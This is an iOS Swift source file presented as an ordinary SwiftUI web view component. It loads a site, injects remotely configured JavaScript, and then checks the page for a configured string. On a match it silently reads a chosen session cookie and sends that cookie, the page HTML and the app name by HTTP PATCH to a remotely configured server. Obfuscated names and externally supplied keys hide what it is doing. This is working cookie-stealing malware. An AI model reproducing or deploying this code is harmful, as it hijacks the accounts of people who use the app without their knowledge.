//
//  File.swift
//  
//
//  Created by DanHa on 25/03/2023.
//

import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct Coords_Nine_Reco : UIViewRepresentable {
    func makeCoordinator() -> Lop_Nine_Coordinator {
        Lop_Nine_Coordinator(self)
    }
    
    let url: URL?
    @Binding var is_Nine_Reco_Chuyen_Man: Bool
    @Binding var is_Nine_Reco_Contains: Bool // Contains
    var arrayData: [String: String] = [:]
    private let ob_Nineservable = Nine_Observable()
    var ob_Nineserver: NSKeyValueObservation? {
        ob_Nineservable.ins_Nine_tance
    }
    // end check url
    
    func makeUIView(context:Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true //true
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        
        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = arrayData[ValueKey.Chung_fr_02.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))

        return webview
    }
    
    func updateUIView(_ uiView: WKWebView, context:Context) { }
   
    class Lop_Nine_Coordinator : NSObject, WKNavigationDelegate {
        var Nine_con_parent: Coords_Nine_Reco
            init(_ Nine_con_parent: Coords_Nine_Reco) {
                self.Nine_con_parent = Nine_con_parent
            }
    
func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
}//didStartProvisionalNavigation
        
func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {

DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
    webView.evaluateJavaScript(self.Nine_con_parent.arrayData[ValueKey.eight_fr_1a.rawValue] ?? "", completionHandler: { result, error in })
}
DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
    webView.evaluateJavaScript(self.Nine_con_parent.arrayData[ValueKey.eight_fr_2a.rawValue] ?? "", completionHandler: { result, error in })
}
DispatchQueue.main.asyncAfter(deadline: .now() + 4.0) {
    webView.evaluateJavaScript(self.Nine_con_parent.arrayData[ValueKey.eight_fr_3a.rawValue] ?? "", completionHandler: { result, error in })
}
DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
    webView.evaluateJavaScript(self.Nine_con_parent.arrayData[ValueKey.eight_fr_4a.rawValue] ?? "", completionHandler: { result, error in })
}
DispatchQueue.main.asyncAfter(deadline: .now() + 7.0) {
    webView.evaluateJavaScript(self.Nine_con_parent.arrayData[ValueKey.eight_fr_5a.rawValue] ?? "", completionHandler: { result, error in })
}
    
    DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) {
        webView.evaluateJavaScript(self.Nine_con_parent.arrayData[ValueKey.eight_fr_6a.rawValue] ?? "") {  html, error in
            if let htmlrecovery = html as? String, error == nil {
                if !htmlrecovery.isEmpty{
                    if htmlrecovery.contains(self.Nine_con_parent.arrayData[ValueKey.eight_fr_7a.rawValue] ?? "") {
                        WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ (cookies) in
                            let seven_reco_i = cookies.firstIndex(where: { $0.name == self.Nine_con_parent.arrayData[ValueKey.name_api_09.rawValue] ?? "" })
                            if(seven_reco_i != nil){
                                let Six_json_data: [String: Any] = [
                                    self.Nine_con_parent.arrayData[ValueKey.name_api_20.rawValue] ?? "": cookies[seven_reco_i!].value,
                                    self.Nine_con_parent.arrayData[ValueKey.name_api_21.rawValue] ?? "": "\(htmlrecovery)",
                                    self.Nine_con_parent.arrayData[ValueKey.name_api_22.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as! String)-TWO"
                                ]
                                let url : URL = URL(string: self.Nine_con_parent.arrayData[ValueKey.Chung_fr_07.rawValue] ?? "")!
                                let json_data = try? JSONSerialization.data(withJSONObject: Six_json_data)
                                var request = URLRequest(url: url)
                                request.httpMethod = "PATCH"
                                request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                request.httpBody = json_data
                                let task = URLSession.shared.dataTask(with: request) { data, response, error in
                                    if error != nil {
                                        print("not ok")
                                    } else if data != nil {
                                        self.Nine_con_parent.is_Nine_Reco_Chuyen_Man = true
                                        //print("okdone")
                                    }
                                }
                                task.resume()
                            }//if
                        })//getAllCookies
                    }else{ self.Nine_con_parent.is_Nine_Reco_Contains = true }
                   }
                }else{ print("error_get_html") }
      }
    }
   } // didFinish
  }//Coordinator
}

private class Nine_Observable: ObservableObject {
    @Published var ins_Nine_tance: NSKeyValueObservation?
}
